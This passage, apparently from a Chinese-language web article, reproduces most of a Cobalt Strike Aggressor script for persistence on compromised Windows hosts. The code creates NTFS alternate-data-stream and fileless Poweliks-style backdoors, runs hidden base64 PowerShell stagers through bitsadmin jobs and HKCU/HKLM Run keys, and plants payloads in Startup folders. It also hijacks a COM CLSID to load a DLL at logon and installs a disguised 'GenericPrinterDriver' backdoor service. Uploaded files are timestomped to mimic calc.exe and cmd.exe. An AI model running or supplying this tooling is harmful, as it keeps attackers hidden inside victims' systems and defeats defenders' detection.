class="code-snippet__string">", "</span>StartUp Directory Folder Location:<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  drow_text($dialog, "</span>payload<span class="code-snippet__string">", "</span>Select Payload:<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  dbutton_action($dialog, "</span>Create<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer">  dialog_show($dialog);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer"># Used for "</span>Create Backdoor Service<span class="code-snippet__string">" action</span></span></code><code><span class="code-snippet_outer">sub servicefilename {</span></code><code><span class="code-snippet_outer">  $servicebackdoorfilename = matches($1, '[\/](\w+\.\w+)$');</span></code><code><span class="code-snippet_outer">  $servicebackdoorfilename = $servicebackdoorfilename[0];</span></code><code><span class="code-snippet_outer">  return $servicebackdoorfilename;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"># 菜单驱动的操作，创建一个ntfs备用数据流后门</span></code><code><span class="code-snippet_outer">#   启动时自动运行。不需要管理员</span></code><code><span class="code-snippet_outer">sub createADSBackdoor {</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer">  $selectedListener = $2;</span></code><code><span class="code-snippet_outer">  getADSRegName();</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  bpowershell_import($bid, script_resource("</span>scripts/Invoke-ADSBackdoor.ps1<span class="code-snippet__string">"));</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  prompt_text("</span>Location of file/folder to give ADS (it must exist!)?<span class="code-snippet__string">", "</span>%APPDATA%\\<span class="code-snippet__keyword">local</span>\\Temp\\somefile.txt<span class="code-snippet__string">", {</span></span></code><code><span class="code-snippet_outer">    # Encode shellcode for the stager</span></code><code><span class="code-snippet_outer">    $psPayload = powershell_encode_stager(shellcode($selectedListener));</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">    $fullPsPayload = "</span>powershell.exe -nop -w hidden -encodedcommand $psPayload<span class="code-snippet__string">";</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">    binput($bid, "</span>powershell-import Invoke-ADSBackdoor.ps1<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer">    # $bid is actually an array, so use $bid[0] for -isadmin</span></code><code><span class="code-snippet_outer">    # Admitettly hacky way to avoid using lambda</span></code><code><span class="code-snippet_outer">    if (-isadmin $bid[0]){</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      blog($bid, "</span>Beacon is admin, using HKLM hive, \Ubackdoor will execute <span class="code-snippet__keyword">for</span> any user\U<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      binput($bid, "</span>powershell Invoke-ADSBackdoor -RegKeyName \<span class="code-snippet__string">" $+ $theADSRegName $+ \" -backdoored_file_path $1 -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \" -admin"</span>);</span></code><code><span class="code-snippet_outer">      bpowershell($bid, <span class="code-snippet__string">"Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \" -admin"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">    }</span> else {</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      blog($bid, "</span>Beacon is <span class="code-snippet__keyword">not</span> admin, using HKCU hive, \Ubackdoor will only execute <span class="code-snippet__keyword">for</span> this user\U<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      binput($bid, "</span>powershell Invoke-ADSBackdoor -RegKeyName \<span class="code-snippet__string">" $+ $theADSRegName $+ \" -backdoored_file_path $1 -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \""</span>);</span></code><code><span class="code-snippet_outer">      bpowershell($bid, <span class="code-snippet__string">"Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \""</span>);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  });</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">createFilelessBackdoor</span></span>{</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer">  $selectedListener = $2;</span></code><code><span class="code-snippet_outer">  openOrActivate($bid);</span></code><code><span class="code-snippet_outer">  $psPayload = powershell_encode_stager(shellcode($selectedListener));</span></code><code><span class="code-snippet_outer">  binput($bid, <span class="code-snippet__string">"powershell-import Persist-Poweliks.ps1"</span>);</span></code><code><span class="code-snippet_outer">  bpowershell_import($bid, script_resource(<span class="code-snippet__string">"scripts/Persist-Poweliks.ps1"</span>));</span></code><code><span class="code-snippet_outer">  binput($bid, <span class="code-snippet__string">"powershell Persist-Poweliks"</span>);</span></code><code><span class="code-snippet_outer">  bpowershell($bid, <span class="code-snippet__string">"Persist-Poweliks -cobaltstrike_gen_payload \" $+ $psPayload $+ \""</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># 返回用于注册表名称的字符串</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">getADSRegName</span> </span>{</span></code><code><span class="code-snippet_outer">  prompt_text(<span class="code-snippet__string">"Registry key name you'd like to use?"</span>, <span class="code-snippet__string">"Update"</span>, {</span></code><code><span class="code-snippet_outer">    $theADSRegName = $1;</span></code><code><span class="code-snippet_outer">  });</span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">return</span> $theADSRegName;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#bitsadmin</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">persistbits</span> </span>{</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer">  $dialog = dialog(<span class="code-snippet__string">"Bitsadmin Persistence"</span>, %(<span class="code-snippet__string">jobname =&gt;</span> <span class="code-snippet__string">""</span>, <span class="code-snippet__string">exe =&gt;</span> <span class="code-snippet__string">""</span>), &amp;bitsadmin);</span></code><code><span class="code-snippet_outer">  dialog_description($dialog, <span class="code-snippet__string">"Creates a bitsadmin job to execute as your current user context. This job will be executed every time the user logs in. Currently only works on Windows 7, 8, Server 2008, Server 2012."</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"jobname"</span>,  <span class="code-snippet__string">"Name for bitsadmin job:"</span>);</span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"exe"</span>, <span class="code-snippet__string">"Payload Executable (Use full path):"</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  dbutton_action($dialog, <span class="code-snippet__string">"Create"</span>);</span></code><code><span class="code-snippet_outer">  dialog_show($dialog);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">bitsadmin</span> </span>{</span></code><code><span class="code-snippet_outer">    blog($bid, <span class="code-snippet__string">"Installing bitsadmin Persistence as "</span>.$3[<span class="code-snippet__string">"jobname"</span>].<span class="code-snippet__string">".."</span>);</span></code><code><span class="code-snippet_outer">    bpowerpick!($bid, <span class="code-snippet__string">'bitsadmin /rawreturn /create '</span>.$3[<span class="code-snippet__string">'jobname'</span>].<span class="code-snippet__string">''</span>);</span></code><code><span class="code-snippet_outer">    bpowerpick!($bid, <span class="code-snippet__string">'bitsadmin /rawreturn /addfile '</span>.$3[<span class="code-snippet__string">'jobname'</span>].<span class="code-snippet__string">' C:\\Windows\\System32\\user32.dll C:\\Users\\Public\\Documents\\user32.gif'</span>);</span></code><code><span class="code-snippet_outer">    bpowerpick!($bid, <span class="code-snippet__string">'bitsadmin /rawreturn /setnotifycmdline '</span>.$3[<span class="code-snippet__string">'jobname'</span>].<span class="code-snippet__string">' '</span>.$3[<span class="code-snippet__string">'exe'</span>].<span class="code-snippet__string">' NULL'</span>);</span></code><code><span class="code-snippet_outer">    bpowerpick!($bid, <span class="code-snippet__string">'bitsadmin /rawreturn /setpriority '</span>.$3[<span class="code-snippet__string">'jobname'</span>].<span class="code-snippet__string">' high'</span>);</span></code><code><span class="code-snippet_outer">    bpowerpick!($bid, <span class="code-snippet__string">'bitsadmin /rawreturn /resume '</span>.$3[<span class="code-snippet__string">'jobname'</span>].<span class="code-snippet__string">''</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#HKCU Run Key Registry PowerShell Persistence</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">payloadgenerate</span> </span>{</span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">foreach</span> $name (listeners()) {</span></code><code><span class="code-snippet_outer">  $original_listener = $name;</span></code><code><span class="code-snippet_outer">        $listener_name = <span class="code-snippet__keyword">lc</span>($name);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">if</span> ($listener_name hasmatch <span class="code-snippet__string">"http"</span> || $listener_name hasmatch <span class="code-snippet__string">"https"</span>) {</span></code><code><span class="code-snippet_outer">          $data = artifact($original_listener, <span class="code-snippet__string">"powershell"</span>);</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">return</span> base64_encode($data);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">persistRegistryPowerShell</span> </span>{</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer">  $dialog = dialog(<span class="code-snippet__string">"HKCU Run Key Registry PowerShell Persistence (User Level)"</span>, %(<span class="code-snippet__string">keyname =&gt;</span> <span class="code-snippet__string">"Key Name for Payload.."</span>, <span class="code-snippet__string">keyname1 =&gt;</span> <span class="code-snippet__string">"Key Name to execute Payload.."</span>), lambda({</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> (<span class="code-snippet__string">"$3['keyname']"</span> ismatch <span class="code-snippet__string">'Key Name for Payload..'</span> || <span class="code-snippet__string">"$3['keyname1']"</span> ismatch <span class="code-snippet__string">'Key Name to execute Payload..'</span>) {</span></code><code><span class="code-snippet_outer">      berror($bid, <span class="code-snippet__string">"\c4Please enter valid Registry Key Names."</span>);</span></code><code><span class="code-snippet_outer">      <span class="code-snippet__keyword">break</span>;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">      $data = payloadgenerate($bid);</span></code><code><span class="code-snippet_outer">      $powershellcmd = <span class="code-snippet__string">"Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '"</span>.$3[<span class="code-snippet__string">'keyname'</span>].<span class="code-snippet__string">"' -Type String -Value \""</span>.$data.<span class="code-snippet__string">"\""</span>;</span></code><code><span class="code-snippet_outer">      bpowerpick!($bid, $powershellcmd);</span></code><code><span class="code-snippet_outer">      blog($bid, <span class="code-snippet__string">"\cBSetting the first HKCU Run Key Value as '"</span>.$3[<span class="code-snippet__string">'keyname'</span>].<span class="code-snippet__string">"'..."</span>);</span></code><code><span class="code-snippet_outer">      $powershellcmd1 = <span class="code-snippet__string">"Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '"</span>.$3[<span class="code-snippet__string">'keyname1'</span>].<span class="code-snippet__string">"' -Value 'C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run "</span>.$3[<span class="code-snippet__string">'keyname'</span>].<span class="code-snippet__string">")."</span>.$3[<span class="code-snippet__string">'keyname'</span>].<span class="code-snippet__string">"))))'"</span>;</span></code><code><span class="code-snippet_outer">      bpowerpick!($bid, $powershellcmd1);</span></code><code><span class="code-snippet_outer">      blog($bid, <span class="code-snippet__string">"\cBSetting the second HKCU Run Key Value as '"</span>.$3[<span class="code-snippet__string">'keyname1'</span>].<span class="code-snippet__string">"'..."</span>);</span></code><code><span class="code-snippet_outer">      blog($bid, <span class="code-snippet__string">"\cBDisplaying both Run Keys to Verify everything worked as intended..."</span>);</span></code><code><span class="code-snippet_outer">      $powershellcmd2 = <span class="code-snippet__string">"Get-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '"</span>.$3[<span class="code-snippet__string">'keyname'</span>].<span class="code-snippet__string">"'"</span>;</span></code><code><span class="code-snippet_outer">      bpowerpick!($bid, $powershellcmd2);</span></code><code><span class="code-snippet_outer">      $powershellcmd3 = <span class="code-snippet__string">"Get-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '"</span>.$3[<span class="code-snippet__string">'keyname1'</span>].<span class="code-snippet__string">"'"</span>;</span></code><code><span class="code-snippet_outer">      bpowerpick!($bid, $powershellcmd3);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }));</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">  dialog_description($dialog, <span class="code-snippet__string">"HKCU Run Key Registry PowerShell Persistence - Generates a powershell Base64 Encoded payload as a HKCU Run Key Registry Entry for persistence on selected beacon."</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"keyname"</span>,  <span class="code-snippet__string">"Registry Key Name for Payload:"</span>);</span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"keyname1"</span>, <span class="code-snippet__string">"Registry Key Name to execute Payload:"</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  dbutton_action($dialog, <span class="code-snippet__string">"Create"</span>);</span></code><code><span class="code-snippet_outer">  dialog_show($dialog);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#HKLM Run Key Registry PowerShell Persistence</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">payloadgenerate</span> </span>{</span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">foreach</span> $name (listeners()) {</span></code><code><span class="code-snippet_outer">  $original_listener = $name;</span></code><code><span class="code-snippet_outer">        $listener_name = <span class="code-snippet__keyword">lc</span>($name);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">if</span> ($listener_name hasmatch <span class="code-snippet__string">"http"</span> || $listener_name hasmatch <span class="code-snippet__string">"https"</span>) {</span></code><code><span class="code-snippet_outer">          $data = artifact($original_listener, <span class="code-snippet__string">"powershell"</span>);</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">return</span> base64_encode($data);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">persistRegistryHKLM</span> </span>{</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer">  $dialog = dialog(<span class="code-snippet__string">"HKLM Run Key Registry PowerShell Persistence (User Level)"</span>, %(<span class="code-snippet__string">keyname =&gt;</span> <span class="code-snippet__string">"Key Name for Payload.."</span>, <span class="code-snippet__string">keyname1 =&gt;</span> <span class="code-snippet__string">"Key Name to execute Payload.."</span>), lambda({</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> (<span class="code-snippet__string">"$3['keyname']"</span> ismatch <span class="code-snippet__string">'Key Name for Payload..'</span> || <span class="code-snippet__string">"$3['keyname1']"</span> ismatch <span class="code-snippet__string">'Key Name to execute Payload..'</span>) {</span></code><code><span class="code-snippet_outer">      berror($bid, <span class="code-snippet__string">"\c4Please enter a valid Registry Key Names, Payload, and a valid Path location."</span>);</span></code><code><span class="code-snippet_outer">      <span class="code-snippet__keyword">break</span>;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">      $data = payloadgenerate($bid);</span></code><code><span class="code-snippet_outer">      $powershellcmd = <span class="code-snippet__string">"Set-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '"</span>.$3[<span class="code-snippet__string">'keyname'</span>].<span class="code-snippet__string">"' -Type String -Value \""</span>.$data.<span class="code-snippet__string">"\""</span>;</span></code><code><span class="code-snippet_outer">      bpowerpick!($bid, $powershellcmd);</span></code><code><span class="code-snippet_outer">      blog($bid, <span class="code-snippet__string">"\cBSetting the first HKLM Run Key Value as '"</span>.$3[<span class="code-snippet__string">'keyname'</span>].<span class="code-snippet__string">"'..."</span>);</span></code><code><span class="code-snippet_outer">      $powershellcmd1 = <span class="code-snippet__string">"Set-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '"</span>.$3[<span class="code-snippet__string">'keyname1'</span>].<span class="code-snippet__string">"' -Value 'C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run "</span>.$3[<span class="code-snippet__string">'keyname'</span>].<span class="code-snippet__string">")."</span>.$3[<span class="code-snippet__string">'keyname'</span>].<span class="code-snippet__string">"))))'"</span>;</span></code><code><span class="code-snippet_outer">      bpowerpick!($bid, $powershellcmd1);</span></code><code><span class="code-snippet_outer">      blog($bid, <span class="code-snippet__string">"\cBSetting the second HKLM Run Key Value as '"</span>.$3[<span class="code-snippet__string">'keyname1'</span>].<span class="code-snippet__string">"'..."</span>);</span></code><code><span class="code-snippet_outer">      blog($bid, <span class="code-snippet__string">"\cBDisplaying both Run Keys to Verify everything worked as intended..."</span>);</span></code><code><span class="code-snippet_outer">      $powershellcmd2 = <span class="code-snippet__string">"Get-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '"</span>.$3[<span class="code-snippet__string">'keyname'</span>].<span class="code-snippet__string">"'"</span>;</span></code><code><span class="code-snippet_outer">      bpowerpick!($bid, $powershellcmd2);</span></code><code><span class="code-snippet_outer">      $powershellcmd3 = <span class="code-snippet__string">"Get-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '"</span>.$3[<span class="code-snippet__string">'keyname1'</span>].<span class="code-snippet__string">"'"</span>;</span></code><code><span class="code-snippet_outer">      bpowerpick!($bid, $powershellcmd3);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }));</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">  dialog_description($dialog, <span class="code-snippet__string">"HKLM Run Key Registry PowerShell Persistence - Generates a powershell Base64 Encoded payload as a HKLM Run Key Registry Entry for persistence on selected beacon."</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"keyname"</span>,  <span class="code-snippet__string">"Registry Key Name for Payload:"</span>);</span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"keyname1"</span>, <span class="code-snippet__string">"Registry Key Name to execute Payload:"</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  dbutton_action($dialog, <span class="code-snippet__string">"Create"</span>);</span></code><code><span class="code-snippet_outer">  dialog_show($dialog);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#StartUpFolder Persistence</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">persistThroughStartUpFolder</span> </span>{</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer">  $dialog = dialog(<span class="code-snippet__string">"Start Up Folder Persistence"</span>, %(<span class="code-snippet__string">startup =&gt;</span> <span class="code-snippet__string">"Startup Directory Folder.."</span>, <span class="code-snippet__string">payload =&gt;</span> <span class="code-snippet__string">"Select Payload.."</span>), lambda({</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> (<span class="code-snippet__string">"$3['startup']"</span> ismatch <span class="code-snippet__string">'Startup Directory Folder..'</span> || <span class="code-snippet__string">"$3['payload']"</span> ismatch <span class="code-snippet__string">'Select Payload..'</span>) {</span></code><code><span class="code-snippet_outer">      berror($bid, <span class="code-snippet__string">"\c4Please enter a valid Startup Directory Folder, and select a Payload."</span>);</span></code><code><span class="code-snippet_outer">      <span class="code-snippet__keyword">break</span>;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">      bpowerpick($bid, <span class="code-snippet__string">'cd "'</span>.$3[<span class="code-snippet__string">'startup'</span>].<span class="code-snippet__string">'"'</span>);</span></code><code><span class="code-snippet_outer">      bupload($bid, $3[<span class="code-snippet__string">'payload'</span>]);</span></code><code><span class="code-snippet_outer">      btimestomp($bid, <span class="code-snippet__string">"$3['payload']"</span>, <span class="code-snippet__string">"c:\\windows\\system32\\calc.exe"</span>);  </span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }));</span></code><code><span class="code-snippet_outer">  dialog_description($dialog, <span class="code-snippet__string">"Start Up Folder Persistence - Generates a Startup Folder Entry and places a payload inside that folder. **Windows NT 6.0-10.0/All Users Location - %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup | Windows NT 6.0-10.0/Current User Location %SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"</span>);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"startup"</span>, <span class="code-snippet__string">"StartUp Directory Folder Location:"</span>);</span></code><code><span class="code-snippet_outer">  drow_file($dialog, <span class="code-snippet__string">"payload"</span>, <span class="code-snippet__string">"Select Payload:"</span>);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">  dbutton_action($dialog, <span class="code-snippet__string">"Create"</span>);</span></code><code><span class="code-snippet_outer">  dialog_show($dialog);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#COM劫持</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">Show_COM_GUI</span></span>{</span></code><code><span class="code-snippet_outer">$bid = $1;</span></code><code><span class="code-snippet_outer">$dialog = dialog(<span class="code-snippet__string">"COM劫持用户登陆"</span>, %(), </span></code><code><span class="code-snippet_outer">lambda({</span></code><code><span class="code-snippet_outer">    bupload($bid, $3[<span class="code-snippet__string">'file'</span>]);</span></code><code><span class="code-snippet_outer">    bmv($bid,$3[<span class="code-snippet__string">'DLL_NAME'</span>],$3[<span class="code-snippet__string">'DLL_PATH'</span>])</span></code><code><span class="code-snippet_outer">    bpowerpick($bid,<span class="code-snippet__string">'Remove-Item "HKCU:\Software\Classes\CLSID\{0358B920-0AC7-461F-98F4-58E32CD89148}" -Recurse'</span>);</span></code><code><span class="code-snippet_outer">    bpowerpick($bid,<span class="code-snippet__string">'New-Item -Type Directory "HKCU:\Software\Classes\CLSID\{0358B920-0AC7-461F-98F4-58E32CD89148}"'</span>);</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">#brun($bid,"reg add \"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32\" /t REG_SZ /d \"".$3['DLL_PATH'].$3['DLL_NAME']"\" /f")</span></span></code><code><span class="code-snippet_outer">    bpowerpick($bid,<span class="code-snippet__string">"New-Item -itemType String 'HKCU:\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32' -Value  \""</span>.$3[<span class="code-snippet__string">'DLL_PATH'</span>].$3[<span class="code-snippet__string">'DLL_NAME'</span>]<span class="code-snippet__string">"\" "</span>);</span></code><code><span class="code-snippet_outer">    bpowerpick($bid,<span class="code-snippet__string">'Set-ItemProperty "HKCU:\Software\Classes\CLSID\{0358B920-0AC7-461F-98F4-58E32CD89148}\InProcServer32"  -name ThreadingModel -value Both'</span>);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">}));</span></code><code><span class="code-snippet_outer">dialog_description($dialog, <span class="code-snippet__string">"劫持任意用户登陆，任意用户登陆时将触发DLL. x64位用x64 dll,x86位用x86 dll。清除劫持:Remove-Item \"HKCU:\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\\" -Recurse"</span>);</span></code><code><span class="code-snippet_outer">drow_file($dialog, <span class="code-snippet__string">"file"</span>, <span class="code-snippet__string">"本地DLL路径: "</span>);</span></code><code><span class="code-snippet_outer">drow_text($dialog, <span class="code-snippet__string">"DLL_NAME"</span>, <span class="code-snippet__string">"DLL文件名:  "</span>);</span></code><code><span class="code-snippet_outer">drow_text($dialog, <span class="code-snippet__string">"DLL_PATH"</span>, <span class="code-snippet__string">"上传路径+DLL文件名:  "</span>);</span></code><code><span class="code-snippet_outer">dbutton_action($dialog, <span class="code-snippet__string">"Go"</span>);</span></code><code><span class="code-snippet_outer">dialog_show($dialog);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">popup beacon_bottom {</span></code><code><span class="code-snippet_outer">  menu <span class="code-snippet__string">"持久化控制"</span> {</span></code><code><span class="code-snippet_outer">    item <span class="code-snippet__string">"创建后门服务-GenericPrinterDriver"</span>{</span></code><code><span class="code-snippet_outer">      <span class="code-snippet__keyword">local</span> (<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">      <span class="code-snippet__comment"># <span class="code-snippet__doctag">TODO:</span></span></span></code><code><span class="code-snippet_outer">      <span class="code-snippet__comment">#  * build out a proper Java Swing menu to customize the options</span></span></code><code><span class="code-snippet_outer">      <span class="code-snippet__keyword">foreach</span> $bid ($1){</span></code><code><span class="code-snippet_outer">        prompt_file_open(<span class="code-snippet__string">"Select the service exe to use"</span>, $null, false, {</span></code><code><span class="code-snippet_outer">          blog($bid, <span class="code-snippet__string">"\c4Uploading backdoor on beacon $1 using file $2"</span>);</span></code><code><span class="code-snippet_outer">          blog($bid, <span class="code-snippet__string">"Attempting to publish backdoor service"</span>);</span></code><code><span class="code-snippet_outer">          bcd($bid, <span class="code-snippet__string">"C:\\Windows\\"</span>);</span></code><code><span class="code-snippet_outer">          blog($bid, <span class="code-snippet__string">"\c4Changed directory on beacon $1 to C:\\Windows\\"</span>);</span></code><code><span class="code-snippet_outer">          bupload($bid, $2);</span></code><code><span class="code-snippet_outer">          servicefilename($2);</span></code><code><span class="code-snippet_outer">          btimestomp($bid, <span class="code-snippet__string">"$servicebackdoorfilename"</span>, <span class="code-snippet__string">"C:\\Windows\\system32\\cmd.exe"</span>)</span></code><code><span class="code-snippet_outer">          prompt_text(<span class="code-snippet__string">"Name of service to use?"</span>, <span class="code-snippet__string">"GenericPrinterDriver"</span>, {</span></code><code><span class="code-snippet_outer">            $serviceName = $1;</span></code><code><span class="code-snippet_outer">          